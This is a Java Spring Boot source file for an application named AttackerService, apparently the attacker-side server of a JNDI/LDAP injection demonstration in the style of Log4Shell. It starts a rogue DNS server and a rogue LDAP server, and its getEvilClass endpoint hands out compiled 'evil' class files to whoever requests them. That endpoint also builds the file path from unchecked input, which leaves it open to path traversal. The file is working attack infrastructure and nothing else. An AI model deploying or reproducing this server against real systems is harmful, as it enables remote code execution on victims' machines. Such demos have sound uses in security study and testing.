package com.example.attackerservice;

import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.stereotype.Controller;
import org.springframework.util.StreamUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.MalformedURLException;

@SpringBootApplication
@Controller
@Slf4j
public class AttackerServiceApplication {

    public static void main(String[] args) {
        SpringApplication.run(AttackerServiceApplication.class, args);
    }

    @Bean
    AttackerDNSServer dnsServer() {
        return new AttackerDNSServer(53);
    }

    @Bean
    AttackerLDAPServer ldapServer() throws MalformedURLException {
        return new AttackerLDAPServer();
    }

    @GetMapping(path="/api/{filename}")
    void getEvilClass(@PathVariable("filename") String filename, HttpServletRequest request, HttpServletResponse response) throws Exception {
        OutputStream strm = response.getOutputStream();
        FileInputStream fis = new FileInputStream("AttackerService/target/classes/" + filename);
        StreamUtils.copy(fis, strm);
    }

}
